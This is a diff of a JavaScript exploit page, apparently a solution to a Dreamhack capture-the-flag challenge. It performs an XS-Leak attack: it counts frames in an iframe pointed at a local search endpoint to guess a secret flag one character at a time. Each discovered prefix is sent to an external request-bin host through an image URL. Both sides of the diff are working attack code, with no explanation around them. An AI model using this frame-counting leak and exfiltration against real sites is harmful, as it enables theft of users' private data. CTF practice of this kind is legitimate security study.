@@ -2,70 +2,31 @@
 <img id="img" />
 
 <script>
-  async function req(url) {
-    return await new Promise((resolve, reject) => {
-      const iframe = document.getElementById("iframe");
-
-      iframe.src = url;
-
+  async function searchChar(data) {
+    return new Promise((resolve) => {
+      iframe.src = "http://127.0.0.1:8000/search?query=" + data;
       iframe.onload = () => {
-        if (iframe.contentWindow.frames.length != 0) {
-          return resolve();
-        } else {
-          return reject();
-        }
+        resolve(iframe.contentWindow.frames.length > 0);
       };
     });
   }
 
-  async function search(query) {
-    try {
-      await req(
-        `http://localhost:8000/search?query=${encodeURIComponent(query)}`,
-      );
-      return true;
-    } catch (e) {
-      return false;
-    }
-  }
+  const iframe = document.getElementById("iframe");
+  const img = document.getElementById("img");
+  const chars = "0123456789abcdef}";
+  let flag = "DH{";
 
-  async function exploit() {
-    const chars = "0123456789abcdef";
-    let secret = "DH{";
-
-    // DH{ 뒤의 16진수 32글자 추출
-    while (secret.length < 35) {
-      let found = false;
-
-      for (const c of chars) {
-        if (await search(secret + c)) {
-          secret += c;
-          found = true;
-
-          img.src =
-            `https://qqmmirq.request.dreamhack.games/` +
-            encodeURIComponent(secret);
-
+  async function findFlag() {
+    while (flag.length <= 35) {
+      for (let i = 0; i < chars.length; i++) {
+        if (await searchChar(flag + chars[i])) {
+          flag += chars[i];
+          img.src = "https://lhvrqrj.request.dreamhack.games?flag=" + flag;
           break;
         }
       }
-
-      // 일치하는 문자가 없을 경우 무한 반복 방지
-      if (!found) {
-        img.src =
-          `https://qqmmirq.request.dreamhack.games/error/` +
-          encodeURIComponent(secret);
-        return;
-      }
     }
-
-    // DH{[0-9a-f]{32}} 완성
-    secret += "}";
-
-    img.src =
-      `https://qqmmirq.request.dreamhack.games/complete/` +
-      encodeURIComponent(secret);
   }
 
-  exploit();
+  findFlag();
 </script>
